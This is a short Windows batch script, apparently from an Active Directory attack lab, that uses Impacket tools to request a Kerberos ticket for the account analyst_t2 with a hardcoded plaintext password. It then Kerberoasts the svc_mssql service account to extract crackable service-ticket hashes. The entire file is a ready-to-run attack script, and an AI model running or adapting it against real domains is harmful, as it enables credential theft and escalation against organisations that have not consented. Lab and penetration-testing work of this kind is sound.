@echo off
REM WT002 step 2+3 — getTGT analyst_t2 then Kerberoast svc_mssql
cd /d C:\Tools\cadre-attack
set PY=C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts
set KRB5CCNAME=C:\Tools\cadre-attack\analyst_t2.ccache

python %PY%\getTGT.py -dc-ip dc02.child.cadre.local "child.cadre.local/analyst_t2:TempPass123!" 2>&1
echo TGT_RC %ERRORLEVEL%
dir analyst_t2.ccache 2>&1

echo === Kerberoast svc_mssql with analyst_t2 TGT ===
python %PY%\GetUserSPNs.py -k -no-pass -dc-ip dc02.child.cadre.local "child.cadre.local/analyst_t2" -request 2>&1
echo KERB_RC %ERRORLEVEL%
